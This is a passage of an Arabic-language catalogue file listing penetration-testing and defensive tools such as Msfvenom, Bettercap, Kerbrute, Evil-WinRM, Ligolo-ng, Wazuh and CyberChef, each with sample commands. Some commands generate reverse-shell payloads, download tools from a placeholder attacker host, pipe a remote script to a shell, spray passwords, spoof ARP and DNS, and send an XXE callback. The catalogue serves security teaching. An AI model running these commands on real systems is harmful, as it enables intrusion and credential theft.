+  desc: `Proxychains أداة لتوجيه أي برنامج Linux عبر SOCKS4/5 أو HTTP Proxy. مفيدة في Pivoting لتوجيه أدوات مثل Nmap وhydra عبر الـ Tunnel.`,
+  features: ['دعم SOCKS4, SOCKS5, HTTP', 'Chaining متعدد الـ Proxies', 'Random وStrict وDynamic Chain', 'يعمل مع كل برامج Linux', 'DNS عبر الـ Proxy'],
+  install: 'sudo apt install proxychains4 -y',
+  version: 'proxychains4 --version',
+  commands: [
+    { cmd: 'proxychains nmap -sT -p 80,443 10.10.10.5', note: 'مسح Nmap عبر Proxy' },
+    { cmd: 'proxychains curl http://10.10.10.5', note: 'طلب HTTP عبر Proxy' },
+    { cmd: 'proxychains firefox', note: 'فتح Firefox عبر Proxy' },
+    { cmd: '# تعديل /etc/proxychains4.conf:\n# socks5 127.0.0.1 1080', note: 'إعداد ProxyChains' },
+  ],
+  tips: ['💡 dynamic_chain في الإعدادات أفضل للـ Pivoting', '💡 -q لتشغيل Proxychains بهدوء'],
+  related: ['Chisel', 'SSH Tunneling', 'Metasploit'],
+},
+{
+  id: 47, name: 'Pacu', icon: '☁️', color: 'rgba(0,150,255,0.12)',
+  short: 'إطار استغلال AWS Cloud',
+  cat: 'cloud', tags: ['cloud','exploitation'],
+  desc: `Pacu إطار عمل مفتوح المصدر لاختبار أمان AWS مستوحى من Metasploit. يحتوي على 45+ module لـ Enumeration والاستغلال وPost-Exploitation في بيئات AWS.`,
+  features: ['45+ Module لـ AWS', 'Enumerate IAM, S3, EC2, Lambda', 'استغلال Misconfigurations', 'Post-Exploitation على AWS', 'تقارير مفصلة'],
+  install: 'git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && pip3 install -r requirements.txt',
+  version: '# python3 pacu.py',
+  commands: [
+    { cmd: 'python3 pacu.py', note: 'تشغيل Pacu' },
+    { cmd: '# داخل Pacu:\nset_keys\nrun iam__enum_permissions', note: 'فحص IAM Permissions' },
+    { cmd: 'run s3__bucket_finder\nrun ec2__enum', note: 'فحص S3 Buckets وEC2' },
+  ],
+  tips: ['💡 aws sts get-caller-identity للتحقق من هويتك أولاً', '💡 ScoutSuite لـ Cloud Security Assessment السريع'],
+  related: ['AWS CLI', 'ScoutSuite', 'CloudMapper', 'prowler'],
+},
+{
+  id: 48, name: 'Recon-ng', icon: '🕵️', color: 'rgba(0,255,200,0.12)',
+  short: 'إطار OSINT مودولار يشبه Metasploit',
+  cat: 'recon', tags: ['recon','osint'],
+  desc: `Recon-ng إطار OSINT مودولار مكتوب بـ Python. يشبه Metasploit في الاستخدام لكنه للاستطلاع والمعلومات. يحتوي على عشرات الـ modules للبحث في DNS، WHOIS، APIs، Social Media.`,
+  features: ['واجهة مثل Metasploit', 'Workspaces لتنظيم المشاريع', 'Database لحفظ النتائج', '60+ Module', 'تصدير HTML Reports'],
+  install: 'sudo apt install recon-ng -y',
+  version: 'recon-ng --version',
+  commands: [
+    { cmd: 'recon-ng\nworkspaces create target_corp', note: 'إنشاء مساحة عمل جديدة' },
+    { cmd: 'marketplace install all\nmodules search whois', note: 'تثبيت وبحث الـ Modules' },
+    { cmd: 'modules load recon/domains-hosts/hackertarget\noptions set SOURCE target.com\nrun', note: 'تشغيل Module لاكتشاف Hosts' },
+    { cmd: 'reporting load reporting/html\nrun', note: 'توليد HTML Report' },
+  ],
+  tips: ['💡 modules search لبحث Module المناسب', '💡 show hosts بعد كل module لرؤية النتائج'],
+  related: ['theHarvester', 'Maltego', 'SpiderFoot'],
+},
+{
+  id: 49, name: 'Shodan CLI', icon: '🌐', color: 'rgba(200,50,255,0.12)',
+  short: 'محرك بحث الأجهزة المتصلة بالإنترنت',
+  cat: 'recon', tags: ['recon','osint','scanning'],
+  desc: `Shodan محرك بحث يفهرس الأجهزة المتصلة بالإنترنت: سيرفرات، كاميرات، أجهزة IoT، راوترات، وغيرها. يمكنك إيجاد أجهزة بخدمات محددة أو إصدارات ضعيفة أو في منطقة جغرافية معينة.`,
+  features: ['فحص IPs وعرض المنافذ والخدمات', 'البحث بـ Filters متقدمة', 'Shodan Dorks', 'API كاملة', 'تنبيهات عند ظهور IP جديد'],
+  install: 'pip3 install shodan\nshodan init YOUR_API_KEY',
+  version: 'shodan --version',
+  commands: [
+    { cmd: 'shodan host 8.8.8.8', note: 'معلومات عن IP محدد' },
+    { cmd: 'shodan search "org:Microsoft" "port:3389"', note: 'بحث RDP على Microsoft' },
+    { cmd: 'shodan search "default password" "webcam"', note: 'كاميرات بـ Default Password' },
+    { cmd: 'shodan count "apache 2.4.49"', note: 'عدد الأجهزة بإصدار ضعيف' },
+    { cmd: 'shodan domain target.com', note: 'معلومات الـ Domain' },
+  ],
+  tips: ['💡 "vuln:CVE-2021-44228" للبحث عن أجهزة بثغرة Log4Shell', '💡 Shodan filters: city, country, port, org, os, product'],
+  related: ['Censys', 'ZoomEye', 'FOFA', 'theHarvester'],
+},
+{
+  id: 50, name: 'LinPEAS / WinPEAS', icon: '🔍', color: 'rgba(0,255,100,0.12)',
+  short: 'Privilege Escalation Automation Script',
+  cat: 'exploitation', tags: ['exploitation','privesc','linux','windows'],
+  desc: `PEASS-ng (Privilege Escalation Awesome Scripts Suite) مجموعة سكريبتات للبحث التلقائي عن نقاط رفع الصلاحيات. LinPEAS لـ Linux وWinPEAS لـ Windows. ملوّنة وتُظهر النتائج بحسب الأولوية.`,
+  features: ['100+ فحص تلقائي', 'نتائج ملوّنة بحسب الأولوية (أحمر=حرج)', 'SUID, Cron, Sudo, Services, Writable Files', 'Credentials مخزنة', 'WinPEAS: AlwaysInstallElevated, Unquoted Paths, Token Privileges'],
+  install: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',
+  version: '# نسخة متجددة دائماً',
+  commands: [
+    { cmd: 'chmod +x linpeas.sh && ./linpeas.sh 2>&1 | tee results.txt', note: 'تشغيل LinPEAS وحفظ النتائج' },
+    { cmd: './linpeas.sh -a', note: 'فحص شامل (أبطأ لكن أكثر تفصيلاً)' },
+    { cmd: '# WinPEAS:\ncertutil.exe -urlcache -f http://ATTACKER/winPEASx64.exe winpeas.exe\n.\\winpeas.exe', note: 'تشغيل WinPEAS على Windows' },
+    { cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', note: 'تشغيل مباشرة من الذاكرة' },
+  ],
+  tips: ['💡 المناطق الحمراء أهمية عالية جداً', '💡 sudo -l وSUID أول ما تبحث عنه في النتائج'],
+  related: ['GTFOBins', 'LSE (linux-smart-enumeration)', 'WES-NG'],
+},
+{
+  id: 51, name: 'Msfvenom', icon: '🧪', color: 'rgba(255,0,100,0.12)',
+  short: 'توليد Payloads وشيفرات الاستغلال',
+  cat: 'exploitation', tags: ['exploitation','payloads'],
+  desc: `Msfvenom أداة Metasploit لتوليد Payloads بكل الصيغ الممكنة. تستطيع إنشاء Reverse Shells لـ Windows وLinux وAndroid وغيرها. تدعم Encoding لتجاوز بعض برامج الحماية.`,
+  features: ['Payloads لكل الأنظمة', 'صيغ: exe, elf, apk, dll, ps1, php, aspx', 'Encoding لتجاوز AV', 'Multi-stage وStageless Payloads', 'دمج Payloads في ملفات موجودة'],
+  install: '# مدمج مع Metasploit\nsudo apt install metasploit-framework -y',
+  version: 'msfvenom --version',
+  commands: [
+    { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe', note: 'Windows Reverse Shell EXE' },
+    { cmd: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > payload.elf', note: 'Linux Reverse Shell ELF' },
+    { cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o app.apk', note: 'Android Meterpreter APK' },
+    { cmd: 'msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php', note: 'PHP Reverse Shell' },
+    { cmd: 'msfvenom --list payloads | grep windows', note: 'قائمة Payloads لـ Windows' },
+  ],
+  tips: ['💡 Stageless (-) أكثر استقراراً من Staged (/) في الشبكات غير المستقرة', '⚠️ تشغيل Payloads على أجهزة دون إذن = جريمة'],
+  related: ['Metasploit', 'Veil', 'shellter', 'MSFconsole'],
+},
+{
+  id: 52, name: 'Bettercap', icon: '🦊', color: 'rgba(255,100,0,0.12)',
+  short: 'الأداة الشاملة لهجمات الشبكة والـ MITM',
+  cat: 'network', tags: ['network','exploitation'],
+  desc: `Bettercap إطار قوي لاختبار أمان الشبكات. يدعم ARP Spoofing، DNS Spoofing، SSL Stripping، WiFi Attacks، Bluetooth Attacks، JavaScript Injection. واجهة تفاعلية وWeb UI.`,
+  features: ['ARP Spoofing وMITM', 'DNS Spoofing', 'SSL Strip وHTTPS Downgrade', 'WiFi Scanning وDeauth', 'Bluetooth Attacks', 'JavaScript Injection في Streams', 'Web UI جميل'],
+  install: 'sudo apt install bettercap -y',
+  version: 'bettercap -version',
+  commands: [
+    { cmd: 'sudo bettercap -iface eth0', note: 'تشغيل Bettercap' },
+    { cmd: 'net.probe on; net.recon on; set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on', note: 'MITM كامل' },
+    { cmd: 'set dns.spoof.domains target.com; set dns.spoof.address 192.168.1.100; dns.spoof on', note: 'DNS Spoofing' },
+    { cmd: 'wifi.recon on; wifi.deauth ff:ff:ff:ff:ff:ff', note: 'WiFi Deauthentication' },
+  ],
+  tips: ['💡 caplets/ يحتوي سكريبتات جاهزة للهجمات', '⚠️ MITM على شبكات دون إذن = جريمة'],
+  related: ['arpspoof', 'mitmproxy', 'ettercap'],
+},
+{
+  id: 53, name: 'Burp Suite Plugins', icon: '🧩', color: 'rgba(255,165,0,0.12)',
+  short: 'إضافات Burp Suite الأساسية',
+  cat: 'webapp', tags: ['webapp'],
+  desc: `Burp Suite BApp Store يحتوي مئات الإضافات المجانية والمدفوعة. أبرزها: ActiveScan++, Turbo Intruder, J2EEScan, Logger++, Autorize, JWT Editor.`,
+  features: ['ActiveScan++ فحص ثغرات متقدم', 'Turbo Intruder: Intruder فائق السرعة', 'Autorize: اختبار Broken Access Control', 'JWT Editor: تعديل JWT مباشرة', 'Logger++: تسجيل كل الطلبات'],
+  install: '# Extender → BApp Store\n# ابحث عن الإضافة وانقر Install',
+  version: '# مدمج مع Burp Suite',
+  commands: [
+    { cmd: '# Turbo Intruder:\n# Right-click request → Send to Turbo Intruder\n# Python script لإرسال ملايين الطلبات', note: 'Turbo Intruder للـ Brute Force السريع' },
+    { cmd: '# Autorize:\n# أضف cookie مستخدم محدود الصلاحيات\n# استعرض الموقع كـ Admin\n# Autorize يكشف ما يمكن للمستخدم المحدود الوصول إليه', note: 'اختبار Access Control بـ Autorize' },
+  ],
+  tips: ['💡 Logger++ يحفظ كل الطلبات حتى في الـ background', '💡 HUNT يضع علامات على Parameters المشبوهة بـ SQLi وXSS وغيرها'],
+  related: ['Burp Suite', 'ZAP', 'OWASP'],
+},
+{
+  id: 54, name: 'OWASP ZAP', icon: '⚡', color: 'rgba(0,200,255,0.12)',
+  short: 'بديل Burp Suite المجاني لفحص تطبيقات الويب',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `OWASP ZAP (Zed Attack Proxy) أداة مجانية كاملة لاختبار أمان تطبيقات الويب. بديل Burp Suite Community مع ميزات أكثر مجاناً: Active Scanner، Fuzzer، Spider، و WebSockets Support.`,
+  features: ['Active و Passive Scanning', 'Spider لاكتشاف الـ endpoints', 'Fuzzer شامل', 'دعم WebSockets', 'تقارير HTML وXML', 'Scripting بـ Groovy وPython', 'API كاملة للأتمتة'],
+  install: 'sudo apt install zaproxy -y',
+  version: 'zaproxy -version',
+  commands: [
+    { cmd: 'zaproxy &\n# أو:\nzaproxy -daemon -port 8090', note: 'تشغيل ZAP' },
+    { cmd: '# في ZAP:\n# Quick Start → Automated Scan → أدخل URL\n# أو: Manual Explore للاختبار اليدوي', note: 'فحص تلقائي بـ ZAP' },
+    { cmd: '# API:\ncurl "http://localhost:8090/JSON/spider/action/scan/?url=http://target.com"', note: 'ZAP API للأتمتة' },
+  ],
+  tips: ['💡 ZAP مجاني بالكامل — Burp Scanner يحتاج Pro', '💡 contexts للتحكم في نطاق الفحص'],
+  related: ['Burp Suite', 'Nikto', 'w3af', 'Acunetix'],
+},
+{
+  id: 55, name: 'Snort / Suricata', icon: '🐷', color: 'rgba(255,150,50,0.12)',
+  short: 'نظام كشف التسلل IDS/IPS المفتوح المصدر',
+  cat: 'network', tags: ['network','defense'],
+  desc: `Snort أشهر نظام IDS مفتوح المصدر، وSuricata نظيره الحديث الأسرع. كلاهما يراقب حركة الشبكة مقارنةً بـ Rules محددة ويُنبّه عند اكتشاف هجمات. Suricata يدعم Multi-threading وأسرع من Snort.`,
+  features: ['فحص حزم الشبكة في الوقت الفعلي', 'آلاف القواعد الجاهزة', 'كشف Nmap وBrute Force وExploits', 'IPS Mode: حجب الهجمات تلقائياً', 'Suricata: Multi-threading أسرع', 'Emerging Threats Rules مجانية'],
+  install: 'sudo apt install snort -y\n# أو Suricata:\nsudo apt install suricata -y',
+  version: 'snort -V\nsuricata --version',
+  commands: [
+    { cmd: 'snort -v -i eth0', note: 'Snort في وضع Sniffer' },
+    { cmd: 'snort -A console -q -c /etc/snort/snort.conf -i eth0', note: 'NIDS Mode مع تنبيهات' },
+    { cmd: 'suricata -c /etc/suricata/suricata.yaml -i eth0', note: 'تشغيل Suricata' },
+    { cmd: '# Rule مثال:\nalert tcp any any -> $HOME_NET 22 (msg:"SSH Scan"; sid:1; rev:1;)', note: 'مثال Snort Rule' },
+  ],
+  tips: ['💡 Suricata أسرع من Snort للشبكات عالية السرعة', '💡 Emerging Threats يوفر Rules مجانية محدّثة يومياً'],
+  related: ['Zeek', 'Wazuh', 'Security Onion', 'pfSense'],
+},
+,
+// ===== NEW TOOLS 56-85 =====
+{
+  id: 56, name: 'Evil-WinRM', icon: '🦂', color: 'rgba(255,50,50,0.12)',
+  short: 'Shell احترافي عبر WinRM لاختبار Windows',
+  cat: 'exploitation', tags: ['exploitation','windows'],
+  desc: `Evil-WinRM أداة Shell تعمل عبر WinRM (Windows Remote Management). مثالية للـ Post-Exploitation على Windows. تدعم: تحميل/تنزيل الملفات، PowerShell Scripts، Pass-the-Hash، Kerberos Authentication.`,
+  features: ['Shell تفاعلي عبر WinRM', 'Pass-the-Hash وKerberos Auth', 'رفع وتنزيل الملفات', 'تشغيل PowerShell Scripts من Linux', 'تحميل DLLs وBypass AMSI'],
+  install: 'sudo gem install evil-winrm',
+  version: 'evil-winrm --version',
+  commands: [
+    { cmd: 'evil-winrm -i 192.168.1.10 -u Administrator -p Password123', note: 'اتصال بـ WinRM' },
+    { cmd: 'evil-winrm -i 192.168.1.10 -u admin -H NTLM_HASH', note: 'Pass-the-Hash' },
+    { cmd: 'evil-winrm -i 192.168.1.10 -u admin -p pass -s /scripts/', note: 'تحميل PowerShell Scripts' },
+    { cmd: '# بعد الاتصال:\nupload /local/file.exe C:\\Windows\\Temp\\file.exe', note: 'رفع ملف للهدف' },
+  ],
+  tips: ['💡 evil-winrm مع -s لتشغيل PowerShell Scripts مباشرة', '💡 يدعم Bypass AMSI بـ -b خيار'],
+  related: ['CrackMapExec', 'impacket', 'Powershell Remoting'],
+},
+{
+  id: 57, name: 'Kerbrute', icon: '🎫', color: 'rgba(100,50,255,0.12)',
+  short: 'Brute Force وEnumeration لـ Kerberos',
+  cat: 'exploitation', tags: ['exploitation','active-directory'],
+  desc: `Kerbrute أداة Go لاختبار Kerberos Authentication في Active Directory. تستخدم لـ Brute Force كلمات المرور، Password Spraying، وتعداد المستخدمين الصحيحين بدون ترك آثار في Logs كثيرة.`,
+  features: ['User Enumeration عبر Kerberos', 'Password Spraying', 'Brute Force مستخدم محدد', 'سريع (Go)', 'أقل ضجيجاً من LDAP Brute Force'],
+  install: '# تنزيل: https://github.com/ropnop/kerbrute/releases',
+  version: 'kerbrute --version',
+  commands: [
+    { cmd: 'kerbrute userenum -d corp.local users.txt --dc 192.168.1.10', note: 'تعداد المستخدمين' },
+    { cmd: 'kerbrute passwordspray -d corp.local users.txt "Company@2024" --dc 192.168.1.10', note: 'Password Spray' },
+    { cmd: 'kerbrute bruteuser -d corp.local rockyou.txt admin --dc 192.168.1.10', note: 'Brute Force مستخدم واحد' },
+  ],
+  tips: ['💡 Password Spray أقل خطراً للـ Account Lockout من Brute Force', '💡 impacket-GetNPUsers بعد إيجاد Users بدون Pre-auth'],
+  related: ['Impacket', 'CrackMapExec', 'BloodHound'],
+},
+{
+  id: 58, name: 'Ligolo-ng', icon: '🌊', color: 'rgba(0,200,255,0.12)',
+  short: 'أسرع أداة Pivoting عبر Tunnel مشفر',
+  cat: 'network', tags: ['network','exploitation'],
+  desc: `Ligolo-ng أداة Go حديثة للـ Pivoting. تنشئ Interface افتراضي على الجهاز المهاجم يُمثّل الشبكة الداخلية. أسرع وأسهل من Proxychains وChisel. تدعم Multiple Subnets وMultiple Agents.`,
+  features: ['Interface افتراضي للشبكة الداخلية', 'لا يحتاج Proxychains', 'Multiple Agents', 'Multiple Subnets', 'سريع جداً (TUN interface)'],
+  install: '# تنزيل: https://github.com/nicocha30/ligolo-ng/releases',
+  version: '# ligolo-ng --version',
+  commands: [
+    { cmd: '# المهاجم (Server):\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert', note: 'إعداد Ligolo Server' },
+    { cmd: '# الضحية (Agent):\n./agent -connect ATTACKER_IP:11601 -ignore-cert', note: 'تشغيل Agent على الضحية' },
+    { cmd: '# في لوحة Ligolo:\nsession\nstart --tun ligolo\n# إضافة Route:\nsudo ip route add 10.10.10.0/24 dev ligolo', note: 'الوصول للشبكة الداخلية' },
+  ],
+  tips: ['💡 أسرع وأسهل من Chisel + Proxychains', '💡 يدعم Listener لـ Reverse connections'],
+  related: ['Chisel', 'Proxychains', 'SSH Tunneling'],
+},
+{
+  id: 59, name: 'SpiderFoot', icon: '🕷️', color: 'rgba(200,100,0,0.12)',
+  short: 'أتمتة OSINT شاملة على الأهداف',
+  cat: 'recon', tags: ['recon','osint'],
+  desc: `SpiderFoot إطار OSINT يُؤتمت جمع المعلومات عن الأهداف من 200+ مصدر. يربط المعلومات تلقائياً ويعرضها في Graph جميل. يدعم IPs, Domains, Emails, Names, ASNs, وغيرها.`,
+  features: ['200+ Module OSINT', 'واجهة ويب جميلة', 'Graph يصل المعلومات ببعضها', 'يعمل تلقائياً بدون تدخل', 'تقارير شاملة', 'API Key Support لمصادر مدفوعة'],
+  install: 'pip3 install spiderfoot\nspiderfoot -l 127.0.0.1:5001',
+  version: 'spiderfoot --help',
+  commands: [
+    { cmd: 'pip3 install spiderfoot && spiderfoot -l 0.0.0.0:5001', note: 'تشغيل SpiderFoot Web UI' },
+    { cmd: '# في الواجهة:\n# New Scan → Target: target.com → Use Case: All\n# انتظر النتائج', note: 'بدء Scan من الواجهة' },
+    { cmd: 'spiderfoot -s target.com -t ALL -f JSON -o results.json', note: 'Scan من سطر الأوامر' },
+  ],
+  tips: ['💡 HX Mode يتيح OSINT أسرع بكثير مع APIs', '💡 اختر Use Case "Investigate" لأعمق نتائج'],
+  related: ['theHarvester', 'Maltego', 'Recon-ng'],
+},
+{
+  id: 60, name: 'DNSx', icon: '🔎', color: 'rgba(0,255,150,0.12)',
+  short: 'فحص DNS سريع وشامل',
+  cat: 'recon', tags: ['recon','scanning'],
+  desc: `DNSx أداة Go سريعة متعددة الوظائف لفحص DNS. تفحص DNS records لقوائم ضخمة من الـ Domains. تدعم A, AAAA, CNAME, MX, TXT, NS, PTR records ويمكنها اكتشاف Wild-card و Zone Transfers.`,
+  features: ['فحص records متعددة دفعة واحدة', 'سريع جداً (Go)', 'Wildcard Detection', 'تصفية حسب Record Type', 'دعم Resolver مخصص'],
+  install: 'go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest',
+  version: 'dnsx -version',
+  commands: [
+    { cmd: 'dnsx -d target.com -a -cname -mx -txt', note: 'فحص records متعددة' },
+    { cmd: 'cat subdomains.txt | dnsx -a -silent', note: 'فحص قائمة Subdomains' },
+    { cmd: 'dnsx -d target.com -axfr', note: 'محاولة Zone Transfer' },
+    { cmd: 'dnsx -l subdomains.txt -resp -o dns_results.txt', note: 'حفظ النتائج مع الـ Responses' },
+  ],
+  tips: ['💡 ادمج مع subfinder: subfinder -d t.com | dnsx -a -silent', '💡 -r لتخصيص Resolver مختلف'],
+  related: ['Amass', 'Subfinder', 'dnsrecon'],
+},
+{
+  id: 61, name: 'httpx', icon: '🌐', color: 'rgba(0,100,255,0.12)',
+  short: 'فحص HTTP سريع لقوائم الـ URLs',
+  cat: 'recon', tags: ['recon','scanning','webapp'],
+  desc: `httpx أداة Go سريعة لفحص قوائم URLs والتحقق من استجابتها. تكشف: Status Codes، Titles، Server Headers، Technology، Redirect Chains. أساسية في Bug Bounty Pipeline.`,
+  features: ['فحص آلاف الـ URLs في ثوانٍ', 'اكتشاف Status Code وTitle', 'Technology Detection', 'Redirect Chains', 'Screenshot بـ headless browser'],
+  install: 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',
+  version: 'httpx -version',
+  commands: [
+    { cmd: 'cat subdomains.txt | httpx -silent', note: 'فحص Subdomains السريع' },
+    { cmd: 'cat urls.txt | httpx -title -status-code -tech-detect', note: 'عرض Title وStatus وTechnology' },
+    { cmd: 'httpx -l urls.txt -mc 200 -o alive.txt', note: 'استخراج URLs التي تعيد 200' },
+    { cmd: 'cat targets.txt | httpx -ss -srd screenshots/', note: 'أخذ Screenshots' },
+  ],
+  tips: ['💡 httpx -tech-detect يكشف Frameworks وCMS', '💡 اجمعه مع subfinder ونuclei في Pipeline'],
+  related: ['Subfinder', 'Nuclei', 'EyeWitness'],
+},
+{
+  id: 62, name: 'Katana', icon: '⚔️', color: 'rgba(255,100,150,0.12)',
+  short: 'Web Crawler سريع لاكتشاف Endpoints',
+  cat: 'recon', tags: ['recon','webapp'],
+  desc: `Katana أداة Go حديثة من ProjectDiscovery لـ Web Crawling. تجمع URLs وParameters والـ Forms من تطبيقات الويب. تدعم JavaScript Rendering لاكتشاف Endpoints في SPAs.`,
+  features: ['JavaScript Rendering', 'اكتشاف Forms والـ Parameters', 'Scope Control', 'سريع جداً', 'دعم Proxy'],
+  install: 'go install github.com/projectdiscovery/katana/cmd/katana@latest',
+  version: 'katana -version',
+  commands: [
+    { cmd: 'katana -u https://target.com', note: 'Crawling أساسي' },
+    { cmd: 'katana -u https://target.com -js-crawl -d 5', note: 'مع JS Rendering عمق 5' },
+    { cmd: 'katana -list urls.txt -o endpoints.txt', note: 'Crawling قائمة URLs' },
+    { cmd: 'katana -u https://target.com -ef png,jpg,gif,css', note: 'تجاهل الموارد الثابتة' },
+  ],
+  tips: ['💡 -jc لتحليل JavaScript Crawling متقدم', '💡 ادمجه مع httpx ونuclei'],
+  related: ['httpx', 'Nuclei', 'Waybackurls', 'gau'],
+},
+{
+  id: 63, name: 'FFUF (Advanced)', icon: '🎯', color: 'rgba(255,200,0,0.12)',
+  short: 'فحص Fuzzing الشامل للويب',
+  cat: 'webapp', tags: ['webapp','fuzzing'],
+  desc: `ffuf (Fuzz Faster U Fool) أداة Fuzzing قوية جداً ومتعددة الاستخدامات. تتفوق على Burp Intruder في السرعة والمرونة. تدعم Fuzzing في كل أجزاء الطلب: URL, Headers, POST Body.`,
+  features: ['Fuzzing كامل لكل أجزاء الطلب', 'Rate Limiting control', 'Recursive Fuzzing', 'Input Wordlists متعددة', 'تصفية متقدمة للنتائج'],
+  install: 'sudo apt install ffuf -y',
+  version: 'ffuf -V',
+  commands: [
+    { cmd: 'ffuf -w subs.txt -u https://FUZZ.target.com -H "Host: FUZZ.target.com" -mc 200', note: 'Virtual Host Fuzzing' },
+    { cmd: 'ffuf -w params.txt -u "https://target.com/page?FUZZ=value" -mc 200', note: 'Parameter Fuzzing' },
+    { cmd: 'ffuf -w payloads.txt -u https://target.com/search -X POST -d "q=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"', note: 'POST Body Fuzzing' },
+    { cmd: 'ffuf -w headers.txt -u https://target.com/ -H "FUZZ: value" -mc 200', note: 'Header Fuzzing' },
+  ],
+  tips: ['💡 -ac لتصفية الردود المتطابقة', '💡 -recursion للبحث التكراري'],
+  related: ['Gobuster', 'Feroxbuster', 'Burp Intruder'],
+},
+{
+  id: 64, name: 'Wazuh', icon: '👁️', color: 'rgba(0,150,200,0.12)',
+  short: 'منصة XDR/SIEM مفتوحة المصدر',
+  cat: 'defense', tags: ['defense','forensics'],
+  desc: `Wazuh منصة أمنية مفتوحة المصدر توفر: SIEM, XDR, File Integrity Monitoring, Vulnerability Detection, Compliance Checking. تُستخدم لمراقبة الأنظمة والكشف عن الهجمات في الوقت الفعلي.`,
+  features: ['SIEM مفتوح المصدر', 'Agent على كل الأنظمة', 'File Integrity Monitoring', 'اكتشاف Rootkits', 'Compliance: PCI-DSS, HIPAA, GDPR', 'Dashboard Kibana', 'Rules قابلة للتخصيص'],
+  install: '# curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh\n# sudo bash ./wazuh-install.sh -a',
+  version: 'wazuh-control info',
+  commands: [
+    { cmd: 'systemctl status wazuh-manager', note: 'التحقق من حالة Wazuh' },
+    { cmd: '# Agent Installation:\ncurl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --import\napt install wazuh-agent', note: 'تثبيت Wazuh Agent' },
+    { cmd: '# تحليل Log:\ncat /var/ossec/logs/alerts/alerts.log | tail -50', note: 'عرض التنبيهات الأخيرة' },
+  ],
+  tips: ['💡 Wazuh Dashboard على Kibana: https://localhost:443', '💡 Wazuh Decoder Rules لتحليل Logs مخصصة'],
+  related: ['Splunk', 'ELK Stack', 'Security Onion', 'AlienVault USM'],
+},
+{
+  id: 65, name: 'OpenVAS / GVM', icon: '🛡️', color: 'rgba(0,255,100,0.12)',
+  short: 'أقوى ماسح ثغرات مفتوح المصدر',
+  cat: 'scanning', tags: ['scanning','vulnerability'],
+  desc: `OpenVAS (الآن GVM - Greenbone Vulnerability Manager) أقوى ماسح ثغرات مفتوح المصدر. يحتوي 80,000+ اختبار ثغرة. يستخدمه محترفو الأمن بديلاً مجانياً لـ Nessus.`,
+  features: ['80,000+ Vulnerability Test', 'Authenticated وUnauthenticated Scanning', 'تقارير PDF احترافية', 'Scheduled Scans', 'تكامل مع Metasploit', 'تحديث يومي لقاعدة البيانات'],
+  install: 'sudo apt install gvm -y && gvm-setup && gvm-start',
+  version: 'gvm-cli --version',
+  commands: [
+    { cmd: 'gvm-setup && gvm-start', note: 'إعداد GVM (يستغرق وقتاً)' },
+    { cmd: '# الواجهة:\nhttps://127.0.0.1:9392\n# Default: admin/كلمة المرور من gvm-setup', note: 'فتح واجهة GVM' },
+    { cmd: 'gvm-feed-update', note: 'تحديث قاعدة بيانات الثغرات' },
+  ],
+  tips: ['💡 Credentialed Scan يكشف ثغرات أعمق بكثير', '💡 تقرير PDF جاهز للعملاء من الواجهة'],
+  related: ['Nessus', 'Nexpose', 'QualysGuard', 'Nuclei'],
+},
+{
+  id: 66, name: 'Burp Collaborator', icon: '📡', color: 'rgba(255,150,0,0.12)',
+  short: 'كشف الثغرات Out-of-Band',
+  cat: 'webapp', tags: ['webapp','ctf'],
+  desc: `Burp Collaborator خادم Burp Suite لاكتشاف الثغرات out-of-band: Blind XXE, Blind SSRF, Blind SQLi, OS Command Injection عندما لا تظهر النتيجة في الاستجابة مباشرة.`,
+  features: ['Collaborator Payload فريد لكل اختبار', 'DNS, HTTP, HTTPS, SMTP Callbacks', 'كشف Blind Vulnerabilities', 'مدمج في Burp Pro', 'Collaborator Everywhere Extension'],
+  install: '# مدمج في Burp Suite Pro\n# أو: interactsh كبديل مجاني',
+  version: '# مدمج',
+  commands: [
+    { cmd: '# في Burp:\n# Burp → Burp Collaborator Client\n# Copy to Clipboard → الصق في Payload\n# Poll Now لرؤية Callbacks', note: 'Burp Collaborator الرسمي' },
+    { cmd: '# interactsh (مجاني):\ngo install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\ninteractsh-client', note: 'Interactsh كبديل مجاني' },
+    { cmd: '# Payload في XXE:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.DOMAIN/">]>', note: 'Blind XXE بـ Collaborator' },
+  ],
+  tips: ['💡 interactsh مجاني وبديل ممتاز لـ Burp Collaborator', '💡 كل Callback يأتي بـ DNS + HTTP'],
+  related: ['Burp Suite', 'interactsh', 'canarytokens'],
+},
+{
+  id: 67, name: 'CyberChef', icon: '👨‍🍳', color: 'rgba(100,200,0,0.12)',
+  short: 'السكين السويسري لتشفير وتحليل البيانات',
+  cat: 'ctf', tags: ['ctf','forensics'],
+  desc: `CyberChef "The Cyber Swiss Army Knife" من GCHQ. يحلل ويحول البيانات: فك تشفير Base64, Hex, ROT13, XOR, AES. تحليل Regex, تحويل صيغ, فك ضغط, استخراج IPs والـ IOCs. يعمل في المتصفح بالكامل.`,
+  features: ['Base64, Hex, ROT13, XOR, AES, RSA', 'Extraction: IPs, URLs, Emails, Hashes', 'Decompression: gzip, zip, zlib', 'Parsing: JSON, CSV, XML', 'Regex Matching', 'Magic: تخمين العملية تلقائياً'],
+  install: '# أونلاين: https://gchq.github.io/CyberChef\n# محلي:\ngit clone https://github.com/gchq/CyberChef.git',
+  version: '# Web Tool',
+  commands: [
+    { cmd: 'echo "SGVsbG8gV29ybGQ=" | base64 -d', note: 'Base64 decode (CLI)' },
+    { cmd: '# CyberChef: Magic Recipe لتخمين التشفير تلقائياً', note: 'Magic Operation' },
